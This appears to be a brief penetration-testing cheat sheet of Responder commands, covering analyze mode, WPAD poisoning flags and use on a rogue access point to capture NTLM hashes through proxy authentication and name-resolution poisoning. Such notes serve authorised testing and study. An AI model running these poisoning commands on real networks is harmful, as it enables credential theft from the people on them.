
Basics :

```
sudo responder -I <interface>
```

------

Analyze mode:

```
sudo responder -I <interface> -A
```

Analyze mode allows to observe what is going on <mark style="background: #FFB86CA6;">without poisoning anything</mark>. 

------

Responder wpad:

```
sudo responder -I <interface> -wF
```

------

Responder on a rogue AP:

```
sudo responder -I <inteface> -dwP -vvv
```

This allows to get NTLM hash when connecting because of the Proxy Auth and pensioning the dns request with wpad.

------
